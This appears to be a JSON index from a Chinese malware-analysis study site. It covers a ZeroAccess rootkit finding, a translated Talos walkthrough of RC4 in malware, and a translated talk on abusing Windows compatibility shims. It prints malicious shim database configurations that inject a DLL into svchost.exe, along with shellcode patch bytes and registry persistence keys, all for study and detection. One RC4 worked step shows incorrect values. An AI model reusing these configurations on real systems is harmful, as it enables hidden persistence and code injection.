driver.814f1b80.sys为了确认转储的模块是恶意的，将其提交给VirusTotal。反病毒软件供应商的结果证实，它是ZeroAccess Rootkit(也被称为Sirefef):\n总结 恶意软件的作者使用各种先进的技术来安装他们的内核驱动程序，并绕过Windows安全机制。一旦安装了内核驱动程序，它就可以修改系统组件或第三方驱动程序来绕过、转移和转移司法分析。在本章中，你看了一些最常见的rootkit技术，我们看到了如何使用内存取证来检测这样的技术。内存取证是一种强大的技术，使用它作为恶意软件分析工作的一部分将极大地帮助您了解攻击者的战术。恶意软件的作者经常想出新的方法来隐藏他们的恶意组件，所以仅仅知道如何使用这些工具是不够的;理解底层概念对于识别攻击者绕过取证工具的努力是很重要的。\n",
    "description": "",
    "tags": "恶意样本分析,学习",
    "title": "恶意样本分析-12-使用内存取证检测高级恶意软件",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-12-%E4%BD%BF%E7%94%A8%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E7%8B%A9%E7%8C%8E%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - 恶意样本分析,学习",
    "uri": "/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "样本分析基础",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/index.html"
  },
  {
    "content": "介绍恶意软件中RC4加密的识别与解码 Jonathan Munshaw\n背景 在第九章9.2.4中RC4的利用简单不容易用加密签名的方式来检测，因此常常被攻击者用于加密。这里根据作者的推荐对Talos的这篇文章进行跟进。\n正文翻译 当我们分析VRT: RC4中的恶意软件时，我们几乎每天都会遇到一些问题。我们最近遇到了CVE-2014-1776，和我们分析的许多恶意软件样本和漏洞一样，RC4被用来混淆或加密它真正在做的事情。实现RC4的方法有很多，它是一个非常简单的小算法。这使得它在野外和各种标准应用程序中非常常见。开源C实现可以在一些网站上找到，比如apple.com和OpenSSL.org。\nRC4是什么? RC4是由RSA安全公司的Ron Rivest在1987年设计的。RC4是一种快速、简单的流密码，使用伪随机数生成算法生成密钥流。此密钥流可用于与明文进行异或操作以生成密文。然后可以使用相同的密钥流对密文进行异或操作，以生成原始明文。 虽然RC4在恶意软件中仍然很常见，但在一些需要考虑速度和隐私的领域，RC4已经被合法地实现了。在过去，WEP和TLS都使用RC4来保护通过线路发送的数据。然而，去年秋天，微软建议客户通过启用TLS1.2和AES-GCM来禁用RC4。\n要了解更多信息，包括RC4的详细历史，请查看维基百科的文章。\n为什么它被用在恶意软件中? 我们越来越多地发现，RC4用于对发送到远程服务器的数据进行编码，这些数据将使用预共享密钥在另一端进行解密。这使得检测变得有点棘手(但不是不可能)，也使确定通过线路发送的确切内容变得更加困难。当我们认为我们遇到某种加密时，我们通常会做的是确定它的来源，被发送的数据是否是静态的(为了匹配目的)，以及数据到底是什么。 它是如何工作的? *注意:对于这些例子，我将使用Coremex Search Engine Hijacker（Coremex搜索引擎劫持者）的一个变体(MD5: 70E2090D5DEE18F3E45D38BF254EFF87)，在它恢复了暂停的子进程之后。 RC4的实现分为两个主要阶段:\n密钥调度算法使用对称密钥来创建256字节(0x100h)的数组。 然后在伪随机数生成算法中使用该数组生成可以使用相同密钥解码的密码流。 许多书籍和网络文章将用以下伪代码表示密钥调度算法(KSA):\nfor i from 0 to 255 S[i]:= i endfor j :=0 for i from 0 to 255 j :=(j + S[i]+ key[i mod keylength])mod256 swap values of S[i]and S[j] endfor为了更好地理解算法是如何工作的，可以将其分成多个部分。\n第一部分 创建并初始化替换框\nfor i from 0 to 255 S[i]:= i endfor本节创建一个数组(或“SBox”/Substitution Box)，其中每个值等于它在数组中从0-255 (0x00-0xFF)的位置，这也称为其标识排列: 在恶意软件样本中寻找这种类型的加密时，这种初始表创建是一个关键指标。对于这个示例，使用x86汇编代码中的以下循环初始化RC4 KSA:\n在恶意软件样本中寻找这种类型的加密时，这种初始表创建是一个关键指标。对于这个示例，使用x86汇编代码中的以下循环初始化RC4 KSA:\n100020E5xoreax,eax ; Initialize counter to 0 loop: 100020E7 ; Give each array index its identity value 100020E7 mov[eax+ecx],al; using EAX as a counter/value: 100020E7 ; S[0] = 0x00 ... S[256] = 0xFF 100020EA inc eax ; Increment counter by 1 100020EB cmp eax,100h ; Compare counter value to 256 (0x100h) // NOTE THE 100h! 100020F0jlshort loop ; Loop around if counter \u003c 256注意，0x100020EB 100h处的指令对于在诸如IDA Pro这样的反汇编程序中搜索二进制文件来说是一个很好的值。寻找将寄存器与100h进行比较的指令通常可以为您指明正确的方向，特别是如果您事先知道恶意软件正在使用RC4的话。\n当查看[eax+ecx]在循环完成后指向的内存转储时，你可以看到新构造的SBox看起来像上图:\n0012FBB0 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F ................ 0012FBC0 10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F ................ 0012FBD0 20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F !\"#$%\u0026'()*+,-./ 0012FBE0 30 31 32 33 34 35 36 37 38 39 3A 3B 3C 3D 3E 3F 0123456789:;\u003c=\u003e? 0012FBF0 40 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F @ABCDEFGHIJKLMNO 0012FC00 50 51 52 53 54 55 56 57 58 59 5A 5B 5C 5D 5E 5F PQRSTUVWXYZ[\\]^_ 0012FC10 60 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F `abcdefghijklmno 0012FC20 70 71 72 73 74 75 76 77 78 79 7A 7B 7C 7D 7E 7F pqrstuvwxyz{|}~. 0012FC30 80 81 82 83 84 85 86 87 88 89 8A 8B 8C 8D 8E 8F Ç.éâäàåçêëèïî.Ä. 0012FC40 90 91 92 93 94 95 96 97 98 99 9A 9B 9C 9D 9E 9F .æÆôöòûùÿÖÜ¢£.Pƒ 0012FC50 A0 A1 A2 A3 A4 A5 A6 A7 A8 A9 AA AB AC AD AE AF áíóúñÑªº¿¬¬½¼¡«» 0012FC60 B0 B1 B2 B3 B4 B5 B6 B7 B8 B9 BA BB BC BD BE BF ¦¦¦¦¦¦¦++¦¦+++++ 0012FC70 C0 C1 C2 C3 C4 C5 C6 C7 C8 C9 CA CB CC CD CE CF +--+-+¦¦++--¦-+- 0012FC80 D0 D1 D2 D3 D4 D5 D6 D7 D8 D9 DA DB DC DD DE DF ---++++++++¦_¦¦¯ 0012FC90 E0 E1 E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF aßGpSsµtFTOd8fen 0012FCA0 F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF =±==()÷˜°··vn²¦既然已经初始化了表，就该打乱方框了。\n第二部分 打乱带有“0006”键的SBox (ASCII 0x30303036)\nj :=0 for i from 0 to 255 j :=(j + S[i]+ key[i mod keylength])mod256 swap values of S[i]and S[j] endfor这个例程接受初始化的表，并使用键及其长度(键的长度可以从1到\u003e255字节)对表执行各种字节交换。下面是这个示例如何实现这个例程。注意，确切的汇编指令会因编译器、平台和语言而异。\n100020F4 loop: ; ECX = S[0] | EDI = j 100020F4mov eax,esi ; Initialize EAX 100020F6cdq ; EAX -\u003e EDX:EAX (with sign) 100020F7idiv [esp+0Ch+keylen] ; EDX = i mod keylen 100020FBmov bl,[esi+ecx] ; BL = S[i] 100020FEmov eax,[esp+0Ch+key] ; EAX = key 10002102movzxeax,byteptr[edx+eax]; EAX = key[i mod keylen] 10002106add eax,edi ; EAX = (j + key[i mod keylen]) 10002108movzxedx,bl ; EDX = S[i] 1000210Badd edx,eax ; EDX = (j + S[i] + key[i mod keylen]) 1000210Dand edx,0FFh ; Another way to mod 255 10002113mov edi,edx ; j = (j + S[i] + key[i mod keylen]) 10002115mov al,[edi+ecx] ; AL = s[j] 10002118mov [esi+ecx],al ; S[i] = S[j] 1000211Binc esi ; i++ 1000211Ccmp esi,100h ; Check if i \u003c 256 // NOTE THE 100h! 10002122mov [edi+ecx],bl ; S[j] = S[i] 10002125jl shortloop; Loop if Less In IDA Pro, the SBox Scramble loop following the Initialization loop may resemble these basic blocks: 用一支铅笔和一张纸手动计算这个例子的至少前几个字节将有助于更清楚地了解字节是如何交换来生成这个新的SBox的:\n初始化SBox: 对于键“0006”的第一个字节(键[0])是“0”，记住这是ASCII“0x30\u003e”:\nj :=(j + S[i]+ key[i mod keylength])mod256 swap values of S[i]andS[j] i =0// first round j =(j+ S[i]+ key[imodkeylength])mod0x100 =(0+ S[0x00]+ key[0mod4])mod0x100 =(0+0+ key[0])mod0x100 =(0+0x30)mod0x100 =0x30mod0x100 =0x30 S[0x0]=0x30 S[0x30]=0x00在字节S[0x00]和S[0x30]交换之后，结果表看起来像这样: 对于键\" 0006 “的第二个字节，(键[1])也是” 0 “，或ASCII \" 0x30 “:\ni =1// second round j =(j+ S[i]+ key[imodkeylength])mod0x100 =(0x30+S[0x01]+ key[1mod4])mod0x100 =(0x30+1+key[1])mod0x100 =(0x31+0x30)mod0x100 =0x61mod0x100 =0x61 S[0x1]=0x100 S[0x61]=0x100在字节S[0x01]和S[0x61]交换之后，结果表看起来像这样: 该算法将继续执行此计算256次。注意，这些值将继续被交换出来，甚至还将交换以前交换的字节。使用“0006”键，恶意软件示例将最终在堆栈上生成以下SBox(我添加了相应的SBox数组索引，仅为了可视化目的): S[00] | 0012FBB0 18 8A 98 7B|16 35 F4 A8|C0 A5 53 94|D0 0D 87 90|  S[10] | 0012FBC0 2B 11 BA 26|08 25 C7 75|EB C6 83 D4|20 12 73 DB| S[20] | 0012FBD0 1B 4E FF D3|EF 72 50 2E|B9 33 AF DC|6C C9 42 8C| S[30] | 0012FBE0 BC 29 3A E8|EC 3B E7 54|44 F5 C3 3F|3C A9 32 17| S[40] | 0012FBF0 59 60 DF 23|F0 6A B7 89|8B 43 7E C2|47 A3 37 A6| S[50] | 0012FC00 34 A7 67 95|D8 B1 46 D9|56 28 A2 5B|7D 4C 41 7F| S[60] | 0012FC10 5E AE 85 88|B2 9C 9B 0F|0A AB 8D 6E|ED 96 40 92| S[70] | 0012FC20 45 1A F9 CE|B0 3E 9D 1D|68 1E E3 13|2A 51 D6 B4| S[80] | 0012FC30 EE 58 D5 E1|D1 BB 39 4A|4F 15 07 B8|80 69 E4 FC| S[90] | 0012FC40 5A 21 A1 1C|7C 9A 0E 5F|FD CB 02 B5|FA BD 57 86| S[A0] | 0012FC50 E9 8E CA E5|5D 19 6F AA|4D CD 71 F2|BE 49 0B E2| S[B0] | 0012FC60 F1 79 A0 D2|B6 DD F6 F8|2F E6 78 C1|52 CF 05 04| S[C0] | 0012FC70 E0 6D 70 97|99 24 FE 06|4B 91 76 A4|B3 FB 63 09| S[D0] | 0012FC80 81 64 00 82|5C C5 EA 36|AD 03 C8 0C|1F 84 48 C4| S[E0] | 0012FC90 74 31 01 55|62 66 8F 9F|38 61 F7 BF|27 7A 22 AC| S[F0] | 0012FCA0 9E 65 77 F3|6B 2C DE DA|30 14 3D CC|2D 93 D7 10|第三部分 生成密钥流并编码数据\ni :=0 j :=0 for x from 0 to len(plaintext) i :=(i +1) mod 256 j :=(j + S[i]) mod 256 swap values of S[i] and S[j] K := S[(S[i]+ S[j]) mod 256] output K ^ plaintext[x] endfor下一步是使用新创建的SBox对数据进行编码。这是通过使用SBox和此算法创建一个密钥流来实现的。然后将结果K用于与明文的每个字节进行异或操作，以生成加密数据。\n这个例程接受修改后的SBox，并再次对表执行各种字节交换。然后它使用这个信息生成密钥流(K)。这个流对明文进行异或运算，直到所有明文都被编码。如果明文的长度超过了密钥流的长度，则密钥流从K[0]开始。下面是这个示例如何实现例程:\n注意，这个示例使用了以下结构(其他实现可能使用u_char作为索引)来存储SBox及其两个计数器:\nstruct rc4_state { u_char perm[256]; // SBox __int32 index1;// i __int32 index2;// j };此示例对有关受害计算机的各种数据进行编码，并将使用此RC4流编码的数据发送到其命令和控制服务器。恶意软件的这部分恰好是对我的一个系统文件进行哈希编码。它编码的原始散列是:EA497F6BD6555BA85127CE083A513BE8:\n10002174loop: 10002174movecx,[ebp+68h+state.index1]; ECX = i 10002177incecx ; i += 1 10002178andecx,esi ; i = i mod 0x100 1000217Amov[ebp+68h+state.index1],ecx; Store i 1000217Dleaedx,[ebp+ecx+68h+state] ; EDX = *S[i] 10002184movzx ecx,byteptr[edx] ; ECX = S[i] 10002187addecx,[ebp+68h+state.index2]; ECX = j + S[i] 1000218Aandecx,esi ; ECX = (j + S[i]) mod 0x100 1000218Cmov[ebp+68h+state.index2],ecx; j = (j + S[i]) mod 0x100 1000218Fmoval,[ebp+ecx+68h+state.perm]; AL = S[j] 10002196movzx ebx,byteptr[edx] ; EBX = S[i] 10002199mov[edx],al ; S[i] = S[j] 1000219Bmoveax,[ebp+68h+state.index2]; EAX = j 1000219Emov[ebp+eax+68h+state.perm],bl; S[j] = S[i] 100021A5moveax,[ebp+68h+Plaintext] ; EAX = Plaintext 100021A8movedx,[ebp+68h+state.index1] ; EDX = i 100021ABmovzx edx,[ebp+edx+68h+state.perm]; EDX = S[i] 100021B3leaecx,[edi+eax]; ECX = *Plaintext[x] 100021B6moveax,[ebp+68h+state.index2]; EAX = j 100021B9movzx eax,[ebp+eax+68h+state.perm]; EAX = S[j] 100021C1addeax,edx; EAX = S[i] + S[j] 100021C3andeax,esi; EAX = (S[i] + S[j]) mod 0x100 100021C5moval,[ebp+eax+68h+state.perm]; AL = S[(S[i] + S[j]) mod 0x100] 100021CCxor[ecx],al; Plaintext[x] ^ Output K 100021CEincedi; x++ 100021CFcmpedi,[ebp+68h+arg_4]; Check if x \u003c len(Plaintext) 100021D2jbshortloop; Loop if x \u003c len(Plain In IDA Pro, the RC4_Crypt loop may resemble these basic blocks: 一旦明文的长度满足，密钥流K就完全生成。随着K的每一个值的生成，它被用来对明文的补充字节进行异或运算，在这种情况下，它看起来像这样: 要解密密文，只需将此过程反向: 用python把它们组合在一起 我在python中实现了rc4，将输入视为字符串，并在打乱之前和之后输出sbox内容。\n*注意:由于此脚本将输入作为字符串，您必须为非ascii字符发送原始字节。在上面的例子中，这可以像这样完成: ./rc4Gen.py 0006 ' perl -e 'print \"\\xEA\\x49\\x7F\\x6B\\xD6\\x55\\x5B\\xA8\\x51\\x27\\xCE\\x08\\x3A\\x51\\x3B\\xE8\"' 'I’ve linked the Python code here: rc4Gen.py\n参考文章 介绍恶意软件中RC4加密的识别与解码 Talos\n",
    "description": "",
    "tags": "样本分析拓展",
    "title": "介绍恶意软件中RC4加密的识别与解码",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8B%93%E5%B1%95/%E4%BB%8B%E7%BB%8D%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%B8%ADRC4%E5%8A%A0%E5%AF%86%E7%9A%84%E8%AF%86%E5%88%AB%E4%B8%8E%E8%A7%A3%E7%A0%81/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - 样本分析拓展",
    "uri": "/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8B%93%E5%B1%95/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "样本分析拓展",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8B%93%E5%B1%95/index.html"
  },
  {
    "content": "背景 在《Malware Analysis》的翻译过程中，8.4.3使用Shim进行内存修补这一节中，作者提到了有关shim或windows打补丁的过程性研究的两篇文章，Jon Erickson的《Using and Abusing Microsoft’s Fix It Patches》和William Ballenthin、Jonathan Tomczak的《The Real Shim Shady》两篇文章。本文就是针对《The Real Shim Shady》的翻译及研究记录。\n正文翻译 Bio, plan . William Ballenthin,逆向工程师\nFireEye实验室高级逆向工程小组 恶意软件分析，正向和反向工程 . Jonathan Tomczak,顾问\nMandiant专业服务 事件响应、取证、工具开发 . 今天的主题：劫持事件的案例研究和调查技术 应用程序兼容性基础设施。\n把火扑灭 . 在处理恶意软件分类队列时，遇到了有趣的情况： - 被网络钓鱼电子邮件锁定的客户端 - 大型部署火眼箱没有开火 - 恶意软件在某种程度上保持了持久性\n. 发生了什么？如何确定检测和调查方法？\n通过Shims注入DLL . 恶意软件：自解压RAR 释放KORPLUG启动器(elogger.dll) 正在加载外壳代码后门（elogger.dat） . elogger.dat做所有的事情：手动加载PE有效负载、注入、privesc、安装服务、HTTP协议 . 另外，安装ACI shim填充程序：\n将两个（32/64位）硬编码的嵌入式SDB文件写入磁盘 调用sdbinst.exe 什么是ACI shims填充程序是什么，为什么他们在系统中？\n. 使用Microsoft Windows更新管理和解决应用程序兼容性问题 . 通过免费提供的应用程序兼容性工具包(ACT)进行配置 . 可执行加载程序内置的API挂钩(\u0026more)\n“垫片”通常实现为代码或配置（禁用功能） 由指示源和目标的数据库（SDB文件）描述的垫片 向OS注册的SDB，由加载程序查询 应用程序兼容性的基础设施，2 . 由可执行文件元数据metadat指定的目标，包括：\n文件名 PE校验和 文件大小 版本信息字段等。 . 有很多垫片可以玩 几十个预配置的快速修复程序（重定向文件读取、更改堆行为） MS分发的数千个SDB条目 一些未记录的特征 SDB的内容 \u003cEXE\u003e\r\u003cNAME type='stringref'\u003eOREGON32.EXE\u003c/NAME\u003e\r\u003cAPP_NAME type='stringref'\u003eThe Oregon Trail v1.2\u003c/APP_NAME\u003e\r\u003cVENDOR type='stringref'\u003eMinnesota Educational Computing Corp.\u003c/VENDOR\u003e\r\u003cEXE_ID type='hex'\u003e568058f1-da4f-4105-8f72-edd5d2a4aaf3\u003c/EXE_ID\u003e\r\u003cAPP_ID type='hex'\u003e82f31111-af62-4849-b866-14c4e748e33c\u003c/APP_ID\u003e\r\u003cMATCH_MODE type='integer'\u003e0x2\u003c/MATCH_MODE\u003e\r\u003cMATCHING_FILE\u003e\r\u003cNAME type='stringref'\u003eOREGON32.DLL\u003c/NAME\u003e\r\u003c/MATCHING_FILE\u003e\r\u003cSHIM_REF\u003e\r\u003cNAME type='stringref'\u003eEmulateGetDiskFreeSpace\u003c/NAME\u003e\r\u003cSHIM_TAGID type='integer'\u003e0x23298\u003c/SHIM_TAGID\u003e\r\u003c/SHIM_REF\u003e\r\u003c/EXE\u003e应用程序兼容性工具包 SDB部署 . sdbinst.exe向操作系统注册SDB文件 - 在控制面板中创建卸载项 - 向注册表项添加值： • HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom • HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB . Microsoft建议在MSI中打包并通过GPO进行部署 . 直接添加注册表值可以绕过sdbinst.exe和extra控制面板条目\n有趣的shims 垫片的名字 作用 DisableWindowsDefender “此修复程序将禁用Windows Defender for不能与Windows Defender一起工作的安全应用程序。 CorrectFilePaths 重定向文件系统路径 LoadLibraryRedirectFlag 更改DLL的加载目录 NoSignatureCheck ???  RelaunchElevated 确保EXE以管理员身份运行 TerminateExe ???  VirtualRegistry 注册表重定向和扩展 技巧1:通过垫片注入DLL(在野) . 自提取RAR 释放KORPLUG启动器(elogger.dll) 正在加载外壳代码后门（elogger.dat） . elogger.dat执行所有操作：手动加载PE有效负载、注入、privesc、安装服务、HTTP协议 . 另外，安装ACI填充程序：\n将两个（32/64位）硬编码的嵌入式SDB文件写入磁盘 调用sdbinst.exe SDB内容 \u003cDATABASE\u003e\u003cNAME type='stringref'\u003eBrucon_Database\u003c/NAME\u003e\r\u003cDATABASE_ID type='guid'\u003e503ec3d4-165b-4771-b798-099d43b833ed\u003c/DATABASE_ID\u003e\r\u003cLIBRARY\u003e \u003cSHIM\u003e\r\u003cNAME type='stringref'\u003eBrucon_Shim\u003c/NAME\u003e\r\u003cDLLFILE type='stringref'\u003eCustom\\elogger.dll\u003c/DLLFILE\u003e\r\u003c/SHIM\u003e\u003c/LIBRARY\u003e\r\u003cEXE\u003e\r\u003cNAME type='stringref'\u003esvchost.exe\u003c/NAME\u003e\r\u003cAPP_NAME type='stringref'\u003eBrucon_Apps\u003c/APP_NAME\u003e\r\u003cEXE_ID type='hex'\u003ee8cc2eb6-469d-43bc-9d6a-de089e497303\u003c/EXE_ID\u003e\r\u003cMATCHING_FILE\u003e\u003cNAME type='stringref'\u003e*\u003c/NAME\u003e\u003c/MATCHING_FILE\u003e\r\u003cSHIM_REF\u003e\u003cNAME type='stringref'\u003eBrucon_Shim\u003c/NAME\u003e\u003c/SHIM_REF\u003e\r\u003c/EXE\u003e\u003c/DATABASE\u003e分析 . 通过特殊的文件格式配置持久性 . 硬编码的SDB文件可通过文件名、ID轻松签名 - 有效负载文件存在于非常有限的目录集中 • C:\\Windows\\AppPatch\\Custom\\ • C:\\Windows\\AppPatch\\Custom\\Custom64\\ . FireEye标识的文件名elogger.dll经常在KORPLUG\u0026SOGU战役。\n技巧2:通过垫片更换参数(在实验室中见) . CorrectFilePath修复将参数从应用程序的路径重定向到 攻击者指定的路径 - 简单的挂钩到CreateProcess、WinExec、ShellExecute\n. 自定义程序mine.exe启动C:\\windows\\temp\\1.exe - Add shim：将C:\\windows\\temp\\1.exe重定向到C:\\dump\\1.exe - CorrectFilePath：“C:\\windows\\temp\\1.exe;C:\\dump\\1.exe”\nSDB内容 \u003cDATABASE\u003e\u003cTIME type='integer'\u003e0x1d100fac0a4a7fc\u003c/TIME\u003e\r\u003cNAME type='stringref'\u003eminesdb\u003c/NAME\u003e\r\u003cDATABASE_ID type='guid'\u003e\r2840a82e-91ff-4f29-bff2-fd1e9780b6eb\u003c/DATABASE_ID\u003e\r\u003cEXE\u003e\r\u003cAPP_NAME type='stringref'\u003emine.exe\u003c/APP_NAME\u003e\r\u003cMATCHING_FILE\u003e\u003cNAME type='stringref'\u003e*\u003c/NAME\u003e\u003c/MATCHING_FILE\u003e\r\u003cSHIM_REF\u003e\r\u003cNAME type='stringref'\u003eCorrectFilePaths\u003c/NAME\u003e\r\u003cCOMMAND_LINE type='stringref'\u003e\r\"C:\\Windows\\Temp\\1.exe; C:\\dump\\1.exe“\r\u003c/COMMAND_LINE\u003e\r\u003c/SHIM_REF\u003e\u003c/EXE\u003e\u003c/DATABASE\u003e分析 . 分析： - 假设目标进程是命令行.exe • 隐藏持久性，过程创建的MITM • #DFIR混乱 - 通过不透明文件格式配置 - 有效负载不限于特定目录\n技巧3:通过垫片注入Shellcode(在野外见) . 网络钓鱼电子邮件导致dropper释放器加载 dropper安装模板SDB并动态修改它们SDB声明它注入到可执行负 载上的外壳代码有效负载是其他阶段的下载器\n. 由趋势科技首次识别发现\nSDB内容 \u003cDATABASE\u003e\u003cNAME type='stringref'\u003eopera.exe\u003c/NAME\u003e\r\u003cDATABASE_ID\u003e\r538f5e1c-932e-4426-b1c9-60a6e15bcd7f\u003c/DATABASE_ID\u003e\r\u003cLIBRARY\u003e\u003cSHIM_REF\u003e\u003cPATCH\u003e\r\u003cNAME type='stringref'\u003epatchdata0\u003c/NAME\u003e\r\u003cPATCH_BITS type='hex'\u003e040000c…0000000000000000\u003c/PATCH_BITS\u003e\r\u003c/PATCH\u003e\u003c/SHIM_REF\u003e\u003c/LIBRARY\u003e\r\u003cEXE\u003e\u003cAPP_NAME type='stringref'\u003eopera.exe\u003c/APP_NAME\u003e\r\u003cMATCHING_FILE\u003e\u003cNAME\u003eopera.exe\u003c/NAME\u003e\u003c/MATCHING_FILE\u003e\r\u003cPATCH_REF\u003e\r\u003cNAME type='stringref'\u003epatchdata0\u003c/NAME\u003e\r\u003cPATCH_TAGID type='integer'\u003e0x6c\u003c/PATCH_TAGID\u003e\r\u003c/PATCH_REF\u003e\u003c/EXE\u003e\u003c/DATABASE\u003e补丁位 . Windows加载程序将任意字节写入模块内存 - PATCH_MATCH验证内存写入目标 - PATCH_REPLACE标记（以原始字节为单位） - 可以同时针对EXE和DLL模块\n补丁细节1 00000000 (04) opcode: PATCH_MATCH\r0000000c (04) rva: 0x00053c2e\r00000014 (64) module_name:u'kernel32.dll'\r00000054 (05) pattern: 9090909090\rdisassembly:\r0x53c2e: nop\r0x53c2f: nop\r0x53c30: nop\r0x53c31: nop\r0x53c32: nop\r00000000 (04) opcode: PATCH_REPLACE\r0000000c (04) rva: 0x00053c2e\r00000014 (64) module_name:u'kernel32.dll'\r00000054 (07) pattern: e8321a0700ebf9\rdisassembly:\r0x53c2e: call 0x000c5665\r0x53c33: jmp 0x00053c29补丁细节2 00000000 (04) opcode: PATCH_MATCH\r0000000c (04) rva: 0x000c5665\r00000014 (64) module_name:u'kernel32.dll'\r00000054 (08) pattern:\r0000000000000000\r00000000 (04) opcode: PATCH_REPLACE\r0000000c (04) rva: 0x000c5665\r00000014 (64) module_name: u'kernel32.dll'\r00000054 (14) pattern:83042402609ce8030000009d61c3\rdisassembly:\r0xc5665: add dword [esp],2\r0xc5669: pushad\r0xc566a: pushfd\r0xc566b: call 0x000c566d\r0xc5670: popfd\r0xc5671: popad\r0xc5672: ret 补丁细节3 \u003c Multi-kilobyte shellcode downloader \u003e补丁详情总结 分析 . MS基础设施的持久性和注入！ . 不透明格式外壳代码的外部存储\n. 从模板动态修改SDB文件 - 为数据库ID生成唯一的GUIDs - 可扩展有效载荷 - 未记录PATCH_BYTES\n透过母体 了解SDB文件\nSDB文件格式 . SDB文件格式是未记录的Microsoft格式 - apphelp.dll公开了大约254个用于操作垫片的导出 - 这对法医分析没有帮助！\nSDB文件格式2 . 所以，我们对它进行了逆向工程\n. 从概念上讲，类似于索引的XML文档 - 三个主要节点：索引、数据库结构和字符串表 - 没有压缩、加密、签名或校验和\n考虑的场景 . 填充定义：名称和填充操作\n\u003cLIBRARY\u003e\u003cSHIM\u003e\r\u003cNAME type='stringref'\u003eBrucon_Shim\u003c/NAME\u003e \u003cDLLFILE type='stringref'\u003eCustom\\elogger.dll\u003c/DLLFILE\u003e \u003c/SHIM\u003e\u003c/LIBRARY\u003e . 应用程序定义：目标和填充指针\n\u003cNAME type='stringref'\u003esvchost.exe\u003c/NAME\u003e \u003cAPP_NAME type='stringref'\u003eBrucon_Apps\u003c/APP_NAME\u003e \u003cSHIM_REF\u003e \u003cNAME type='stringref'\u003eBrucon_Shim\u003c/NAME\u003e \u003cSHIM_TAGID type='integer'\u003e0x47c\u003c/SHIM_TAGID\u003e \u003c/SHIM_REF\u003e python-sdb . 存在一些用于解包SDB文件的工具 - 但它们依赖于Windows API . python-sdb是一个用于解析sdb的跨平台纯Python库 - Python API使得构建检查SDB特性的脚本变得很容易 - 提供了以各种XML风格转储数据库的示例脚本 . https://github.com/williballenthin/python-sdb\n检测方法 在大型环境中大规模调查恶意垫片\n考虑的场景 . Trojan.mambashim - Python（什么，只需阅读源代码！？！） - 模糊字节码 - 安装服务，或使用ctypes动态创建sdb并安装 - sdb导致Windows加载程序将DLL有效负载启动器注入putty44.exe 你知道这发生在你的环境中吗？\n现有的管理工具？ . 事实：Trojan.mambashim使用英语单词字典生成随机sdb路径，使用sd binst.exe安装\n. ACI失败： . 系统上没有SDB的集中管理 . 没有用于SDB管理的Active Directory工具 . 不记帐ACI更改或回滚功能 . 赢了？ . 也许通过流程审计抓住sdbinst.exe？\nACI完整性检查吗? . SDB文件未签名:\u003c . 按哈希将SDB列入白名单不起作用 . 例如，在6000台主机上收集会产生18000个唯一的SDB文件\n. 嵌入的时间戳和安装顺序会影响SDB完整性检查 . 如果Office安装在Visual Studio之前，反之亦然 另一个系统，它可能会导致不同的SDB。\n质量检验和异常检测1 . 获取，检查%systemdrive%*.sdb . 合法的SDB通常驻留在Windows和程序文件中 . 在%USERSPROFILE%的工作目录中发现攻击者SDB . 获取，检查\n. HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom . HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB . 默认SDB：drvmain,frxmain,msimain,pcamain,sysmain . Trojan.mambashim\n随机标头时间戳（范围0-最大int64（！！！）） 随机编译器版本（rand.rand.rand.rand） EXE供应商名称\"供应商” 随机数据库ID（嗯，这是一个GUID…） 随机EXE ID（也称为GUID…） . 但是，黑名单不会缩放 . 适合打猎，而不是开火就忘了 质量检验和异常检测2 Microsoft-Windows-Application-Experience-Program-Telemetry.evtx\nCompatibility fix applied to C:\\PROGRAM FILES\\Putty\\putty44.exe.\rFix information: vendor, {7e4053fe-ade9-426f-9dc2-0bbfa76b5366},\r0x80010156.应用于C:\\PROGRAM FILES\\Putty\\putty44.exe的兼容性修复程序。 修复信息：供应商，{7e4053fe-ade9-426f-9dc2-0bbfa76b5366}，0x80010156。\n. 你有可以检测“异常条目”的技术吗？ - 计数元组（主机名、供应商、应用程序）和排序ASC - 对新元组发出警报？\n领域特定哈希 . 实际上，Trojan.mambashim可能更糟糕。\n. 我们不指望黑名单会扩大，那只是在追赶 . 我们真的想加入白名单： . 但是，不能按哈希将整个文件列入白名单（见前面） . 散列填充程序可以定义和应用程序定义嘛？ . 